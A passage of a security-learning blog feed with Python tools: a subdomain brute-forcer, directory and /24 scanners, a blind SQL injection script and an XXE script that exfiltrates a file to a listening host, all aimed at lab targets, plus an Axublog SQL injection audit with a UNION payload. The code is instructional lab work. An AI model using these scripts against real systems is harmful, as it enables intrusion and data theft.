class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">import dns.resolver</span><br><span class="line">import threading</span><br><span class="line">import<span class="built_in"> Queue </span></span><br><span class="line">import optparse</span><br><span class="line">import sys                    </span><br><span class="line"></span><br><span class="line">queue = Queue.Queue()</span><br><span class="line">lock = threading.Lock()</span><br><span class="line"></span><br><span class="line">class GetSubDomain(threading.Thread):</span><br><span class="line">    <span class="string">""</span><span class="string">"docstring for SubDomain"</span><span class="string">""</span></span><br><span class="line">    def __init__(self, target,queue,outfile):</span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line">        self.target = target</span><br><span class="line">        self.queue = queue</span><br><span class="line">        self.rsv = dns.resolver.Resolver()</span><br><span class="line">        outfile = target + <span class="string">'.txt'</span> <span class="keyword">if</span> <span class="keyword">not</span> outfile <span class="keyword">else</span> outfile</span><br><span class="line">        self.f = open(<span class="string">'./output/'</span>+outfile,<span class="string">'a+'</span>)</span><br><span class="line">        self.ip_list = []</span><br><span class="line"></span><br><span class="line">    def _scan(self):</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self.queue.empty():</span><br><span class="line">            self.ip_list = []</span><br><span class="line">            ips = None</span><br><span class="line">            sub_domain = self.queue.<span class="builtin-name">get</span>() + <span class="string">'.'</span> + self.target</span><br><span class="line">            <span class="keyword">for</span> _ <span class="keyword">in</span> range(3):</span><br><span class="line">                try:</span><br><span class="line">                    answers = self.rsv.query(sub_domain)</span><br><span class="line">                    <span class="keyword">if</span> answers:</span><br><span class="line">                        <span class="keyword">for</span> answer <span class="keyword">in</span> answers:</span><br><span class="line">                            <span class="keyword">if</span> answer.address <span class="keyword">not</span> <span class="keyword">in</span> self.ip_list:</span><br><span class="line">                                self.ip_list.append(answer.address)</span><br><span class="line">                except dns.resolver.NoNameservers, e:</span><br><span class="line">                    break</span><br><span class="line">                except Exception, e:</span><br><span class="line">                    pass</span><br><span class="line">            <span class="keyword">if</span> len(self.ip_list)&gt;0:</span><br><span class="line">                ips = <span class="string">','</span>.join(self.ip_list)</span><br><span class="line">                msg = sub_domain.ljust(30) + ips + <span class="string">'\n'</span></span><br><span class="line">                lock.acquire()</span><br><span class="line">                <span class="builtin-name">print</span> msg</span><br><span class="line">                self.f.write(msg)</span><br><span class="line">                lock.release()</span><br><span class="line">            self.queue.task_done()</span><br><span class="line"></span><br><span class="line">    def <span class="builtin-name">run</span>(self):</span><br><span class="line">        self._scan()</span><br><span class="line"></span><br><span class="line">def get_target(domain_list):</span><br><span class="line">    targets = []</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> open(domain_list,<span class="string">'r'</span>):</span><br><span class="line">        <span class="keyword">if</span> line:</span><br><span class="line">            targets.append(line.strip())</span><br><span class="line">    return targets</span><br><span class="line"></span><br><span class="line">def get_sub_queue(sub_file): #得到所有子域名的queue</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> open(sub_file,<span class="string">'r'</span>):</span><br><span class="line">        <span class="keyword">if</span> line:</span><br><span class="line">            queue.put(line.strip())</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    parser = optparse.OptionParser()</span><br><span class="line">    parser.add_option(<span class="string">'-u'</span>, <span class="string">'--url'</span>, <span class="attribute">dest</span>=<span class="string">'url'</span>,</span><br><span class="line">        <span class="attribute">type</span>=<span class="string">'string'</span>, <span class="attribute">help</span>=<span class="string">'Get a single top-level domain names.'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-l'</span>, <span class="string">'--list'</span>, <span class="attribute">dest</span>=<span class="string">'domain_list'</span>,</span><br><span class="line">        <span class="attribute">type</span>=<span class="string">'string'</span>, <span class="attribute">help</span>=<span class="string">'Top-level domain name list.'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-f'</span>, <span class="string">'--file'</span>, <span class="attribute">dest</span>=<span class="string">'sub_file'</span>, <span class="attribute">default</span>=<span class="string">'sub.txt'</span>,</span><br><span class="line">        <span class="attribute">type</span>=<span class="string">'string'</span>, <span class="attribute">help</span>=<span class="string">'Dict file used to brute sub names'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-t'</span>, <span class="string">'--threads'</span>, <span class="attribute">dest</span>=<span class="string">'threads_num'</span>, <span class="attribute">default</span>=60, </span><br><span class="line">        <span class="attribute">type</span>=<span class="string">'int'</span>, <span class="attribute">help</span>=<span class="string">'Number of threads. default = 60'</span>)</span><br><span class="line">    parser.add_option(<span class="string">'-o'</span>, <span class="string">'--outfile'</span>, <span class="attribute">dest</span>=<span class="string">'outfile'</span>, <span class="attribute">default</span>=None,</span><br><span class="line">        <span class="attribute">type</span>=<span class="string">'string'</span>, <span class="attribute">help</span>=<span class="string">'Output file name. default is &#123;target&#125;.txt'</span>)</span><br><span class="line"></span><br><span class="line">    (options, args) = parser.parse_args()</span><br><span class="line">    <span class="keyword">if</span> options.url:</span><br><span class="line">        urls = [options.url]</span><br><span class="line">    elif options.domain_list:</span><br><span class="line">        urls = get_target(options.domain_list)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        parser.print_help()</span><br><span class="line">        <span class="builtin-name">print</span> <span class="string">"Example: "</span></span><br><span class="line">        <span class="builtin-name">print</span> <span class="string">"\tpython getsub.py -u baidu.com"</span></span><br><span class="line">        <span class="builtin-name">print</span> <span class="string">"\tpython getsub.py -l domain.txt -f sub.txt -t 50"</span></span><br><span class="line">        sys.exit(0)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> url <span class="keyword">in</span> urls:</span><br><span class="line">        get_sub_queue(options.sub_file)</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> xrange(1,options.threads_num+1):</span><br><span class="line">            t = GetSubDomain(url,queue,options.outfile)</span><br><span class="line">            t.setDaemon(<span class="literal">True</span>)</span><br><span class="line">            t.start()</span><br><span class="line">        queue.join()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;python编写子域名爆破小工具&quot;&gt;&lt;a href=&quot;#python编写子域名爆破小工具&quot; class=&quot;headerlink&quot; title=&quot;python编写子域名爆破小工具&quot;&gt;&lt;/a&gt;python编写子域名爆破小工具&lt;/h2&gt;&lt;h4 id=&quot;字典生成工具编写&quot;
      
    
    </summary>
    
    
      <category term="python学习" scheme="https://shu1l.github.io/categories/python%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>python编写sql注入&amp;xml注入工具</title>
    <link href="https://shu1l.github.io/2020/04/20/python-bian-xie-sql-zhu-ru-xml-zhu-ru-gong-ju/"/>
    <id>https://shu1l.github.io/2020/04/20/python-bian-xie-sql-zhu-ru-xml-zhu-ru-gong-ju/</id>
    <published>2020-04-20T04:41:52.000Z</published>
    <updated>2020-04-28T05:03:45.471Z</updated>
    
    <content type="html"><![CDATA[<h2 id="python编写sql注入-amp-xml注入工具"><a href="#python编写sql注入-amp-xml注入工具" class="headerlink" title="python编写sql注入&amp;xml注入工具"></a>python编写sql注入&amp;xml注入工具</h2><h4 id="python编写sql盲注注入脚本"><a href="#python编写sql盲注注入脚本" class="headerlink" title="python编写sql盲注注入脚本"></a>python编写sql盲注注入脚本</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">import requests  #导入request模块</span><br><span class="line"></span><br><span class="line">url = <span class="string">'http://192.168.181.138/sqli-labs-master/Less-8/?id=1%s'</span></span><br><span class="line">headers = &#123;<span class="string">'User-Agent'</span>:<span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0'</span>&#125;  #定义请求header头</span><br><span class="line"><span class="attribute">check_data</span>=list('1234567890abcdefghijklmnopqrstuzwxyz@')  </span><br><span class="line"><span class="builtin-name">print</span>(<span class="string">"SQL Injection for MySQL!"</span>)</span><br><span class="line">l = <span class="string">"' and length(database())=%s and '1'='1"</span>            #定义注入语句</span><br><span class="line">st = <span class="string">"' and substr(database(),%s,1)='%s'and '1'='1"</span>     #定义注入语句</span><br><span class="line">user = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(0,20):</span><br><span class="line">    sql = l % str(i)        #payload拼接</span><br><span class="line">    judge1 = requests.<span class="builtin-name">get</span>(url % sql,<span class="attribute">headers</span>=headers,timeout=30)</span><br><span class="line">    <span class="keyword">if</span> judge1.content.<span class="builtin-name">find</span>(b<span class="string">"You are in..........."</span>) != -1:   #判断页面回显</span><br><span class="line">        length = i</span><br><span class="line">        <span class="builtin-name">print</span>(i)</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> range(1,i+1):</span><br><span class="line">    <span class="keyword">for</span> ss <span class="keyword">in</span> check_data:</span><br><span class="line">        str_user = st % (str(k),str(ss))</span><br><span class="line">        judge2 = requests.<span class="builtin-name">get</span>(url % str_user,<span class="attribute">headers</span>=headers,timeout = 30)</span><br><span class="line">        <span class="keyword">if</span> judge2.content.<span class="builtin-name">find</span>(b<span class="string">"You are in..........."</span>) != -1:</span><br><span class="line">           <span class="built_in"> user </span>=<span class="built_in"> user </span>+ ss</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="builtin-name">print</span>(user)</span><br></pre></td></tr></table></figure><h4 id="python编写xml注入脚本"><a href="#python编写xml注入脚本" class="headerlink" title="python编写xml注入脚本"></a>python编写xml注入脚本</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">from http.server import HTTPServer,CGIHTTPRequestHandler</span><br><span class="line">import threading</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def web_server():</span><br><span class="line">    port = 3344</span><br><span class="line">    httpd = HTTPServer(('',port),CGIHTTPRequestHandler)</span><br><span class="line">    print("[*] Starting simple_httpd on port:",httpd.server_port)</span><br><span class="line">    httpd.serve_forever()</span><br><span class="line"></span><br><span class="line">def send_data():</span><br><span class="line">    files = 'C:/web/PHPTutorial/WWW/xxe-lab-master/php_xxe/doLogin.php'</span><br><span class="line">    data = "<span class="meta">&lt;?xml version=\"1.0\"?&gt;</span>\r\n<span class="meta">&lt;!DOCTYPE <span class="meta-keyword">test</span> [\r\n<span class="meta">&lt;!ENTITY % <span class="meta-keyword">file</span> <span class="meta-keyword">SYSTEM</span> \<span class="meta-string">"php://filter/read=convert.base64-encode/resource=C:/web/PHPTutorial/WWW/xxe-lab-master/php_xxe/doLogin.php\"&gt;\r\n&lt;!ENTITY % dtd SYSTEM \"http://192.168.181.128/evil.xml\" &gt;\r\n%dtd;\r\n%send;\r\n]&gt;"</span></span></span></span><br><span class="line"><span class="meta"><span class="meta">    <span class="meta-keyword">requests</span>.post("<span class="meta-keyword">http</span>://192.168.181.138/<span class="meta-keyword">xxe-lab-master</span>/<span class="meta-keyword">php_xxe</span>/",<span class="meta-keyword">data</span>=<span class="meta-keyword">data</span>)</span></span></span><br><span class="line"><span class="meta"><span class="meta">    <span class="meta-keyword">files</span> = <span class="meta-keyword">input</span>("<span class="meta-keyword">Write</span> <span class="meta-keyword">filename</span>")</span></span></span><br><span class="line"><span class="meta"><span class="meta"></span></span></span><br><span class="line"><span class="meta"><span class="meta">if <span class="meta-keyword">__name__</span> == <span class="meta-string">'__main__'</span>:</span></span></span><br><span class="line"><span class="meta"><span class="meta">    <span class="meta-keyword">file</span> = <span class="meta-keyword">open</span>('<span class="meta-keyword">evil</span>.<span class="meta-keyword">xml</span>','w')</span></span></span><br><span class="line"><span class="meta"><span class="meta">    <span class="meta-keyword">file</span>.write("&lt;!<span class="meta-keyword">ENTITY</span> % <span class="meta-keyword">payload</span> \"&lt;!<span class="meta-keyword">ENTITY</span> &amp;<span class="meta-keyword">#x25</span>; <span class="meta-keyword">send</span> <span class="meta-keyword">SYSTEM</span> '<span class="meta-keyword">HTTP</span>://192.168.181.128/?<span class="meta-keyword">content</span>=%<span class="meta-keyword">file</span>;'&gt;\"&gt; %<span class="meta-keyword">payload</span>;")</span></span></span><br><span class="line"><span class="meta"><span class="meta">    <span class="meta-keyword">file</span>.close()</span></span></span><br><span class="line"><span class="meta"><span class="meta">    <span class="meta-keyword">t1</span> = <span class="meta-keyword">threading</span>.Thread(<span class="meta-keyword">target</span>=<span class="meta-keyword">web_server</span>)</span></span></span><br><span class="line"><span class="meta"><span class="meta">    <span class="meta-keyword">t1</span>.start()</span></span></span><br><span class="line"><span class="meta"><span class="meta">    <span class="meta-keyword">t2</span> = <span class="meta-keyword">threading</span>.Thread(<span class="meta-keyword">target</span>=<span class="meta-keyword">send_data</span>)</span></span></span><br><span class="line"><span class="meta"><span class="meta">    <span class="meta-keyword">t2</span>.start()</span></span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;python编写sql注入-amp-xml注入工具&quot;&gt;&lt;a href=&quot;#python编写sql注入-amp-xml注入工具&quot; class=&quot;headerlink&quot; title=&quot;python编写sql注入&amp;amp;xml注入工具&quot;&gt;&lt;/a&gt;python编写sql
      
    
    </summary>
    
    
      <category term="python学习" scheme="https://shu1l.github.io/categories/python%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>python编写简单C段&amp;web目录扫描工具</title>
    <link href="https://shu1l.github.io/2020/04/20/python-bian-xie-c-duan-web-mu-lu-sao-miao-gong-ju/"/>
    <id>https://shu1l.github.io/2020/04/20/python-bian-xie-c-duan-web-mu-lu-sao-miao-gong-ju/</id>
    <published>2020-04-20T04:41:18.000Z</published>
    <updated>2020-04-28T05:01:43.120Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Python编写C段-amp-web目录扫描工具"><a href="#Python编写C段-amp-web目录扫描工具" class="headerlink" title="Python编写C段&amp;web目录扫描工具"></a>Python编写C段&amp;web目录扫描工具</h2><h4 id="python编写目录扫描工具"><a href="#python编写目录扫描工具" class="headerlink" title="python编写目录扫描工具"></a>python编写目录扫描工具</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"><span class="keyword">from</span> optparse import OptionParser</span><br><span class="line">import threading</span><br><span class="line"><span class="keyword">from</span><span class="built_in"> Queue </span>import Queue</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line">class WEB_DIR(threading.Thread):</span><br><span class="line">    def __init__(self,queue):</span><br><span class="line">            threading.Thread.__init__(self)</span><br><span class="line">            self._queue = queue</span><br><span class="line">    def <span class="builtin-name">run</span>(self):</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self._queue.empty():</span><br><span class="line">            url = self._queue.<span class="builtin-name">get</span>()</span><br><span class="line">            try:</span><br><span class="line">                headers = &#123;<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr'</span>&#125;</span><br><span class="line">                r = requests.<span class="builtin-name">get</span>(url, <span class="attribute">headers</span>=headers, <span class="attribute">timeout</span>=1)</span><br><span class="line">            except Exception,e:</span><br><span class="line">              pass</span><br><span class="line">            <span class="keyword">if</span> r.status_code == 200:</span><br><span class="line">                <span class="builtin-name">print</span> <span class="string">'[*]'</span> + url</span><br><span class="line"></span><br><span class="line">def start(url,file,count):</span><br><span class="line">   <span class="built_in"> queue </span>= Queue()</span><br><span class="line">    f = open(<span class="string">'%s.txt'</span> % file, <span class="string">'r'</span>)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> f:</span><br><span class="line">        queue.put(url + i.strip(<span class="string">'\r\n'</span>))</span><br><span class="line">    threads = []</span><br><span class="line">    thread_count = int(count)</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(thread_count):</span><br><span class="line">        threads.append(WEB_DIR(queue))</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">        t.join()</span><br><span class="line"></span><br><span class="line">def main():</span><br><span class="line">    parser = OptionParser()</span><br><span class="line">    parser = OptionParser()</span><br><span class="line">    parser.add_option(<span class="string">"-u"</span>,<span class="string">"--url"</span>,<span class="attribute">dest</span>=<span class="string">"url"</span>,help="Target url <span class="keyword">for</span> scan<span class="string">")</span></span><br><span class="line"><span class="string">    parser.add_option("</span>-f<span class="string">", "</span>--file<span class="string">", dest="</span>filename<span class="string">", help="</span>Dir filename<span class="string">")</span></span><br><span class="line"><span class="string">    parser.add_option("</span>-t<span class="string">", "</span>--thread<span class="string">", dest="</span>count<span class="string">",type=int,default=10, help="</span>scan thread count<span class="string">")</span></span><br><span class="line"><span class="string">    options,args = parser.parse_args()</span></span><br><span class="line"><span class="string">    if options.url and options.filename:</span></span><br><span class="line"><span class="string">        start(options.url,options.filename,options.count)</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        parser.print_help()</span></span><br><span class="line"><span class="string">        sys.exit(1)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">if __name__ == '__main__':</span></span><br><span class="line"><span class="string">    main()</span></span><br></pre></td></tr></table></figure><h4 id="python编写C段扫描工具"><a href="#python编写C段扫描工具" class="headerlink" title="python编写C段扫描工具"></a>python编写C段扫描工具</h4><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">import ipaddr</span><br><span class="line">import requests</span><br><span class="line">import threading</span><br><span class="line"><span class="keyword">from</span><span class="built_in"> Queue </span>import Queue</span><br><span class="line">import sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class C_Scan(threading.Thread):</span><br><span class="line">    def __init__(self,queue):</span><br><span class="line">            threading.Thread.__init__(self)</span><br><span class="line">            self._queue = queue</span><br><span class="line">    def <span class="builtin-name">run</span>(self):</span><br><span class="line">        <span class="keyword">while</span> <span class="keyword">not</span> self._queue.empty():</span><br><span class="line">            r = 0</span><br><span class="line">            url = str(self._queue.<span class="builtin-name">get</span>())</span><br><span class="line">            url = <span class="string">'http://'</span>+url</span><br><span class="line">            try:</span><br><span class="line">                headers = &#123;<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr'</span>&#125;</span><br><span class="line">                r = requests.<span class="builtin-name">get</span>(url, <span class="attribute">headers</span>=headers, <span class="attribute">timeout</span>=1)</span><br><span class="line">            except Exception,e:</span><br><span class="line">                pass</span><br><span class="line">            <span class="keyword">if</span> r.status_code == 200:</span><br><span class="line">                    <span class="builtin-name">print</span> <span class="string">'[*]'</span> + url</span><br><span class="line">def main():</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != 2:</span><br><span class="line">        <span class="builtin-name">print</span> <span class="string">'Usage: Python %s 192.168.1.1/24'</span>%(sys.argv[0])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        threads = []</span><br><span class="line">        threadnum = 250</span><br><span class="line">       <span class="built_in"> queue </span>= Queue()</span><br><span class="line">        cidrip = sys.argv[1]</span><br><span class="line">        ips = ipaddr.IPNetwork(cidrip)</span><br><span class="line">        <span class="keyword">for</span><span class="built_in"> ip </span><span class="keyword">in</span> ips:</span><br><span class="line">            queue.put(ip)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(threadnum):</span><br><span class="line">            threads.append(C_Scan(queue))</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">            t.start()</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> threads:</span><br><span class="line">            t.join()</span><br><span class="line">        <span class="builtin-name">print</span> <span class="string">"All Finished!!!"</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;Python编写C段-amp-web目录扫描工具&quot;&gt;&lt;a href=&quot;#Python编写C段-amp-web目录扫描工具&quot; class=&quot;headerlink&quot; title=&quot;Python编写C段&amp;amp;web目录扫描工具&quot;&gt;&lt;/a&gt;Python编写C段&amp;amp
      
    
    </summary>
    
    
      <category term="python学习" scheme="https://shu1l.github.io/categories/python%E5%AD%A6%E4%B9%A0/"/>
    
    
  </entry>
  
  <entry>
    <title>Axublog代码审计学习</title>
    <link href="https://shu1l.github.io/2020/04/19/axublog-dai-ma-shen-ji-xue-xi/"/>
    <id>https://shu1l.github.io/2020/04/19/axublog-dai-ma-shen-ji-xue-xi/</id>
    <published>2020-04-19T12:00:16.000Z</published>
    <updated>2020-04-28T03:44:06.866Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Axublog代码审计学习"><a href="#Axublog代码审计学习" class="headerlink" title="Axublog代码审计学习"></a>Axublog代码审计学习</h2><h4 id="前台数字型sql注入"><a href="#前台数字型sql注入" class="headerlink" title="前台数字型sql注入"></a>前台数字型sql注入</h4><h5 id="漏洞位置：axublog-hit-php"><a href="#漏洞位置：axublog-hit-php" class="headerlink" title="漏洞位置：axublog/hit.php"></a>漏洞位置：axublog/hit.php</h5><h5 id="漏洞分析："><a href="#漏洞分析：" class="headerlink" title="漏洞分析："></a>漏洞分析：</h5><p>hit.php漏洞关键代码：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">header(<span class="string">"Content-type:text/html; charset=utf-8"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">require</span>(<span class="string">"cmsconfig.php"</span>);</span></span><br><span class="line"><span class="php"><span class="keyword">require</span>(<span class="string">"class/c_other.php"</span>);</span></span><br><span class="line"><span class="php">sqlguolv();</span></span><br><span class="line"></span><br><span class="line"><span class="php">$g=$_GET[<span class="string">'g'</span>];</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="php"><span class="keyword">if</span> ($g==<span class="string">'arthit'</span>)&#123;</span></span><br><span class="line"><span class="php">$id=$_GET[<span class="string">'id'</span>];        </span></span><br><span class="line"><span class="php">    <span class="keyword">if</span>($id!=<span class="string">''</span>)&#123;</span></span><br><span class="line"><span class="php">    </span></span><br><span class="line"><span class="php">$tab=$tabhead.<span class="string">"arts"</span>;</span></span><br><span class="line"><span class="php">mysql_select_db($tab);</span></span><br><span class="line"><span class="php">$sql=mysql_query(<span class="string">"UPDATE "</span>.$tab.<span class="string">" SET hit=hit+1 where id="</span>.$id);  <span class="comment">//直接将$_GET['id']提取的                                                                      id带入sql查询，没有经过  有效过滤</span></span></span><br><span class="line"><span class="php">$sql = mysql_query(<span class="string">"select * from "</span>.$tab.<span class="string">" where id="</span>.$id);</span></span><br><span class="line"><span class="php">$row=mysql_fetch_array($sql);</span></span><br><span class="line"><span class="php">    $str=$row[<span class="string">'hit'</span>];</span></span><br><span class="line"><span class="php">    <span class="keyword">echo</span> <span class="string">'document.write('</span>.$str.<span class="string">');'</span>;</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure><p>我们尝试直接传入payload尝试：</p><figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/hit/php?g=archit&amp;id=<span class="number">1</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>,<span class="number">8</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">11</span>,<span class="number">12</span></span><br></pre></td></tr></table></figure><p>发现被拦截。</p><p>我们发现在get传参之前，有一个过滤函数。</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">if</span>(<span class="title">sqlguolv</span>()==<span class="number">1</span>)&#123;<span class="title">die</span>(<span class="string">'禁止输入特殊符号和非法访问！'</span>);&#125;</span></span><br></pre></td></tr></table></figure><p>我们找到这个函数：位于axublog\class\c_other.php:690行</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span 